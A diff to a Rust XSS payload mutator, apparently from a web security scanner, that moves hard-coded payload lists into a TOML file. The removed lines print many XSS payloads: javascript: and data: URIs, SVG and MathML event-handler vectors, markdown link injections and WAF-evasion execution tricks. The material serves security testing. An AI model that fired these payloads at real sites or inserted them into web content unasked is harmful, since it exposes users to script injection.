@@ -73,90 +73,55 @@ const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
 // ──────────────────────────────────────────────
 //  JavaScript execution functions
 // ──────────────────────────────────────────────
-
-/// Alternative ways to execute JavaScript.
-///
-/// Audit (2026-05-10): added modern execution paths the original list
-/// missed — `print()` (browser print dialog, observable side-effect),
-/// `queueMicrotask` (defers to next microtask, often slips past
-/// keyword-only WAFs), `location=` assignment (forces navigation to a
-/// javascript: URI, observable in URL bar / referer), and `open()`
-/// (popup / new tab, also keyword-bypass-friendly).
-const EXEC_FUNCTIONS: &[&str] = &[
-    "alert(1)",
-    "alert`1`", // Tagged template literal
-    "confirm(1)",
-    "confirm`1`",
-    "prompt(1)",
-    "print()",
-    "eval('alert(1)')",
-    "setTimeout('alert(1)')",
-    "setInterval('alert(1)',0)",
-    "queueMicrotask(()=>alert(1))",
-    "Function('alert(1)')()",
-    "constructor.constructor('alert(1)')()",
-    "[].constructor.constructor('alert(1)')()",
-    "window['alert'](1)",
-    "self['alert'](1)",
-    "top['alert'](1)",
-    "this['alert'](1)",
-    "location='javascript:alert(1)'",
-    "location.href='javascript:alert(1)'",
-    "open('javascript:alert(1)')",
-    "globalThis['alert'](1)",
-];
-
-// ──────────────────────────────────────────────
-//  URI scheme payloads
+//  XSS payload corpus — loaded from rules/xss/payloads.toml.
+//
+// Tier-B community-extensible: append a new `[[exec_function]]` /
+// `[[uri_scheme]]` / `[[svg]]` / `[[mathml]]` / `[[markdown]]` row in
+// the TOML to teach the mutator a new shape; no Rust changes required.
 // ──────────────────────────────────────────────
 
-/// Various ways to trigger JavaScript via URI schemes.
-const URI_SCHEMES: &[&str] = &[
-    "javascript:alert(1)",
-    "javascript:alert`1`",
-    "javascript:void(alert(1))",
-    "data:text/html,<script>alert(1)</script>",
-    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-    "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>",
-];
+#[derive(serde::Deserialize)]
+struct XssPayloadRules {
+    exec_function: Vec<ExecFunctionEntry>,
+    uri_scheme: Vec<PayloadEntry>,
+    svg: Vec<PayloadEntry>,
+    mathml: Vec<PayloadEntry>,
+    markdown: Vec<PayloadEntry>,
+}
 
-// ──────────────────────────────────────────────
-//  SVG-specific payloads
-// ──────────────────────────────────────────────
+#[derive(serde::Deserialize)]
+struct ExecFunctionEntry {
+    template: String,
+}
 
-/// SVG-based XSS using animation events.
-const SVG_PAYLOADS: &[&str] = &[
-    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
-    "<svg><set onbegin=alert(1) attributename=x to=1>",
-    "<svg><script>alert(1)</script></svg>",
-    "<svg><image href=1 onerror=alert(1)>",
-    "<svg><a><rect width=100 height=100></a><animate attributeName=href values=javascript:alert(1)>",
-];
+#[derive(serde::Deserialize)]
+struct PayloadEntry {
+    payload: String,
+}
 
-// ──────────────────────────────────────────────
-//  MathML-specific payloads
-// ──────────────────────────────────────────────
+fn xss_payload_rules() -> &'static XssPayloadRules {
+    static RULES: std::sync::OnceLock<XssPayloadRules> = std::sync::OnceLock::new();
+    RULES.get_or_init(|| {
+        let raw = include_str!("../../rules/xss/payloads.toml");
+        toml::from_str(raw).expect("rules/xss/payloads.toml must parse")
+    })
+}
 
-const MATHML_PAYLOADS: &[&str] = &[
-    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
-    "<math><mtext><script>alert(1)</script></mtext></math>",
-    "<math href=javascript:alert(1)>CLICKME</math>",
-    "<math><maction onclick=alert(1)>X</maction></math>",
-];
-
-// ──────────────────────────────────────────────
-//  Markdown-specific payloads
-// ──────────────────────────────────────────────
-
-const MARKDOWN_PAYLOADS: &[&str] = &[
-    "[x](javascript:alert(1))",
-    "![x](javascript:alert(1))",
-    "[x](javascript:alert(1) 'title')",
-    "[x](data:text/html,<script>alert(1)</script>)",
-    "<img src=x onerror=alert(1)>",
-    "<script>alert(1)</script>",
-    "[link](//evil.com)",
-];
+fn exec_functions() -> &'static [ExecFunctionEntry] {
+    &xss_payload_rules().exec_function
+}
+fn uri_schemes() -> &'static [PayloadEntry] {
+    &xss_payload_rules().uri_scheme
+}
+fn svg_payloads() -> &'static [PayloadEntry] {
+    &xss_payload_rules().svg
+}
+fn mathml_payloads() -> &'static [PayloadEntry] {
+    &xss_payload_rules().mathml
+}
+fn markdown_payloads() -> &'static [PayloadEntry] {
+    &xss_payload_rules().markdown
+}
 
 // ──────────────────────────────────────────────
 //  Public API
@@ -295,10 +260,11 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
 
     // Strategy 1: Tag/event substitution with all exec functions
     for (prefix, suffix, _extra) in TAG_EVENT_COMBOS {
-        for exec_fn in EXEC_FUNCTIONS {
+        for entry in exec_functions() {
             if results.len() >= tag_event_budget {
                 break;
             }
+            let exec_fn = entry.template.as_str();
             let mutated = format!("{prefix}{exec_fn}{suffix}");
             if mutated != payload {
                 results.push(XssMutation {
@@ -339,10 +305,11 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
     // global default mutation.
 
     // Strategy 4: URI scheme payloads
-    for scheme in URI_SCHEMES {
+    for entry in uri_schemes() {
         if results.len() >= max_mutations {
             break;
         }
+        let scheme = entry.payload.as_str();
         results.push(XssMutation {
             payload: scheme.to_string(),
             description: format!("URI scheme: {}", &scheme[..scheme.len().min(30)]),
@@ -351,12 +318,12 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
     }
 
     // Strategy 5: SVG-specific payloads
-    for svg in SVG_PAYLOADS {
+    for entry in svg_payloads() {
         if results.len() >= max_mutations {
             break;
         }
         results.push(XssMutation {
-            payload: svg.to_string(),
+            payload: entry.payload.clone(),
             description: "SVG animation/script execution".into(),
             rules_applied: vec!["svg_payload"],
         });
@@ -556,24 +523,24 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
     }
 
     // Strategy 18: MathML context payloads
-    for math in MATHML_PAYLOADS {
+    for entry in mathml_payloads() {
         if results.len() >= max_mutations {
             break;
         }
         results.push(XssMutation {
-            payload: math.to_string(),
+            payload: entry.payload.clone(),
             description: "MathML parser-differential XSS".into(),
             rules_applied: vec!["mathml"],
         });
     }
 
     // Strategy 19: Markdown context payloads
-    for md in MARKDOWN_PAYLOADS {
+    for entry in markdown_payloads() {
         if results.len() >= max_mutations {
             break;
         }
         results.push(XssMutation {
-            payload: md.to_string(),
+            payload: entry.payload.clone(),
             description: "Markdown link/HTML injection XSS".into(),
             rules_applied: vec!["markdown"],
         });
